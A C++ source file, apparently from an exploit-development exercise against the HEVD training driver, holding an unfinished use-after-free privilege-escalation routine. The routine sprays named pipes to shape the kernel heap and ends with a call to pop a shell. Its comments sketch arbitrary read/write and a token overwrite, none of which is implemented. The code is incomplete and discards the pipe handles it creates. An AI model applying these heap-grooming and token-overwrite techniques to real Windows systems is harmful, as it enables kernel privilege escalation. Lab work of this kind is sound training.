#include "UseAfterFreeNx.hpp"
#include "PreExploitation.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"

namespace UseAfterFreeNx
{

void exploit()
{
	// Still at work, currently working on the shaping/deterministic overwrite

	DEBUG_PRINT("[+] Starting UAF NX exploit...\n");

	/*
	* Shape heap using pipes to deterministaclly get the fake object in the same pool
	* Escalate to arbitrary read/write using PeekNamedPipe - SMAP?
	* Overwrite token
	*/

	HEVDCommunication hevd;

	DEBUG_PRINT("[+] Phase 1: shaping the heap\n");
	static constexpr size_t PIPE_SHAPING_COUNT = 10000;
	std::vector<HANDLE> heap_shaping_pipe_array;
	heap_shaping_pipe_array.resize(PIPE_SHAPING_COUNT);
	static constexpr std::wstring_view PIPE_NAME = L"\\\\.\\pipe\\UAFNX";
	for (size_t i = 0; i < PIPE_SHAPING_COUNT; i++)
	{
		CreateNamedPipeW(PIPE_NAME.data(), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, 0x1337, 0x1337, NULL, NULL);
	}


	DEBUG_PRINT("[+] Popping a shell\n");
	PostExploitation::pop_shell();
}

}